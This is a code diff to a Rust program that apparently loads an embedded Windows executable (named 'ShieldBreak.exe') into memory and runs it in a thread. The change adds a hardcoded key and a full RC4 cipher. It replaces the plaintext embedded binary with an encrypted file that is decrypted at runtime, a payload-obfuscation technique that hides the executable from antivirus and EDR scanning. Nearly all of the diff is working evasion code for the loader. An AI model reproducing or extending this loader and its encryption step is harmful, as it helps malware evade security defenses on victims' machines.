@@ -41,6 +41,44 @@ macro_rules! IMAGE_FIRST_SECTION {
     }};
 }
 
+const KEY: &[u8] = &[
+    0x70, 0x6c, 0x6d, 0x6f, 0x6b, 0x6e, 0x69, 0x6a, 0x62, 0x75, 0x68, 0x76, 0x79, 0x67, 0x63, 0x74,
+    0x66, 0x78, 0x72, 0x64, 0x7a, 0x65, 0x73, 0x77, 0x61, 0x71,
+];
+
+struct Rc4 {
+    state: [u8; 256],
+    i: usize,
+    j: usize,
+}
+
+impl Rc4 {
+    fn new(key: &[u8]) -> Self {
+        let mut state = [0u8; 256];
+        for (i, b) in state.iter_mut().enumerate() {
+            *b = i as u8;
+        }
+
+        let mut j = 0;
+        for i in 0..256 {
+            j = (j + state[i] as usize + key[i % key.len()] as usize) % 256;
+            state.swap(i, j);
+        }
+
+        Rc4 { state, i: 0, j: 0 }
+    }
+
+    fn process(&mut self, data: &mut [u8]) {
+        for byte in data.iter_mut() {
+            self.i = (self.i + 1) % 256;
+            self.j = (self.j + self.state[self.i] as usize) % 256;
+            self.state.swap(self.i, self.j);
+            let k = self.state[(self.state[self.i] as usize + self.state[self.j] as usize) % 256];
+            *byte ^= k;
+        }
+    }
+}
+
 unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
     unsafe {
         let thread_handle = param as *mut c_void;
@@ -295,7 +333,10 @@ fn main() {
 
     // BUFFER.set(buffer).expect("Failed to set buffer");
 
-    let buffer = include_bytes!("../ShieldBreak.exe").to_vec();
+    let mut buffer = include_bytes!("../proc.enc").to_vec();
+
+    let mut rc4 = Rc4::new(KEY);
+    rc4.process(&mut buffer);
 
     BUFFER.set(buffer).expect("Failed to set buffer");
 
